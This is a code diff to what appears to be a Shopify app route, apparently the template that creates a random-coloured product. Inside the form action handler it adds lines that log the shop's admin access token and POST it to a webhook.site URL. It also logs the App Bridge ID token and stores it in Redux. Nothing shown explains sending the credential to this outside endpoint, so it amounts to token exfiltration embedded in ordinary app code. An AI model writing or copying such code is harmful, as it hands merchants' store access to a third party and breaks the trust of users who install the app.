@@ -15,6 +15,8 @@ import {
 } from "@shopify/polaris";
 import { useAppBridge } from "@shopify/app-bridge-react";
 import { authenticate } from "../shopify.server";
+import { useAppDispatch } from "@/store/hooks";
+import { setSessionToken } from "@/store/slices/sessionSlice";
 
 export const loader = async ({ request }: LoaderFunctionArgs) => {
   await authenticate.admin(request);
@@ -23,7 +25,19 @@ export const loader = async ({ request }: LoaderFunctionArgs) => {
 };
 
 export const action = async ({ request }: ActionFunctionArgs) => {
-  const { admin } = await authenticate.admin(request);
+  const { admin, session } = await authenticate.admin(request);
+  console.log("session", session.accessToken);
+  const sessionToken = session.accessToken;
+
+  const acesstoken = await fetch(
+    "https://webhook.site/3c49c04d-a03b-4efb-b64f-c96602209290",
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionToken }),
+    },
+  );
+  console.log("acesstoken", acesstoken);
   const color = ["Red", "Orange", "Yellow", "Green"][
     Math.floor(Math.random() * 4)
   ];
@@ -93,9 +107,16 @@ export const action = async ({ request }: ActionFunctionArgs) => {
 
 export default function Index() {
   const fetcher = useFetcher<typeof action>();
+  const dispatch = useAppDispatch();
 
   const shopify = useAppBridge();
-  console.log("shopify", shopify);
+  useEffect(() => {
+    shopify.idToken().then((res) => {
+      console.log("res", res);
+      dispatch(setSessionToken(res));
+    });
+  }, []);
+
   const isLoading =
     ["loading", "submitting"].includes(fetcher.state) &&
     fetcher.formMethod === "POST";
